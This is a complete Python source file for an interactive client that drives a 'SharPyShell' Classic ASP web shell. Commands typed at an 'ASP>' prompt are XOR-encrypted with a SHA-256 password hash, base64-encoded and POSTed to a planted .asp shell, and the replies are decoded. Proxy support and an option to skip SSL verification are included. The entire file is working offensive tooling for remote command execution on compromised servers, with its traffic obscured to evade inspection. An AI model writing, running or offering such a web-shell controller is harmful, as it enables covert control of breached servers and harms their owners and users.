#!/usr/bin/env python3

import sys
import hashlib
import base64
import requests
import argparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def xor_encrypt(data, key):
    key_bytes = key.encode('iso-8859-1')
    data_bytes = data.encode('iso-8859-1')
    result = bytearray()
    for i, b in enumerate(data_bytes):
        result.append(b ^ key_bytes[i % len(key_bytes)])
    return bytes(result)


def send_command(url, command, password_hash, verify_ssl=True, proxy=None):
    encrypted = xor_encrypt(command, password_hash)
    payload = base64.b64encode(encrypted).decode()

    proxies = {'http': proxy, 'https': proxy} if proxy else None
    resp = requests.post(
        url,
        data={'data': payload},
        verify=verify_ssl,
        proxies=proxies,
        timeout=30,
    )

    if not resp.text:
        return '[empty response]'

    try:
        decoded = base64.b64decode(resp.text)
        result = xor_encrypt(decoded.decode('iso-8859-1'), password_hash)
        return result.decode('iso-8859-1', errors='replace')
    except Exception as e:
        return f'[decode error: {e}]\nRaw: {resp.text[:200]}'


def main():
    parser = argparse.ArgumentParser(description='SharPyShell Classic ASP interactive client')
    parser.add_argument('-u', '--url', required=True, help='URL of the .asp shell')
    parser.add_argument('-p', '--password', required=True, help='Password (same as used during generate)')
    parser.add_argument('-k', '--insecure', action='store_true', help='Skip SSL certificate verification')
    parser.add_argument('--proxy', default=None, help='HTTP/SOCKS proxy (e.g. http://127.0.0.1:8080)')
    args = parser.parse_args()

    password_hash = hashlib.sha256(args.password.encode('utf-8')).hexdigest()

    print(f'[*] Connected to {args.url}')
    print('[*] Type "exit" to quit\n')

    while True:
        try:
            cmd = input('ASP> ').strip()
        except (EOFError, KeyboardInterrupt):
            print('\n[*] Exiting.')
            break

        if not cmd:
            continue
        if cmd.lower() == 'exit':
            print('[*] Exiting.')
            break

        try:
            output = send_command(args.url, cmd, password_hash, not args.insecure, args.proxy)
            print(output)
        except requests.exceptions.RequestException as e:
            print(f'[!] Request failed: {e}')


if __name__ == '__main__':
    main()
